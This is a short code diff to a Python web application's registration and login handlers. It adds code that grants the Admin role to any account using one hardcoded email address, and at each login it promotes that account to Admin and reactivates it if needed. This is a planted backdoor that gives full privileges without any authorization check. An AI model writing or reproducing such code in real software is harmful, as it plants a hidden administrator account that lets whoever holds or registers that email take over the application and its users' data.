@@ -690,7 +690,7 @@ def register(auth: AuthRegisterRequest):
         new_user = User(
             full_name=auth.name.strip(),
             email=email,
-            role="User",
+            role="Admin" if email == "leadergr13@gmail.com" else "User",
             status="Active",
             password_hash=hash_password(auth.password),
         )
@@ -742,6 +742,13 @@ def login(auth: AuthLoginRequest):
                 detail={"error": "Unauthorized",
                         "message": "Invalid email or password"},
             )
+
+        # Promote to Admin if email matches
+        if email == "leadergr13@gmail.com" and db_user.role != "Admin":
+            db_user.role = "Admin"
+            db_user.status = "Active"
+            db.commit()
+            db.refresh(db_user)
 
         token = create_access_token({
             "user_id": db_user.id,
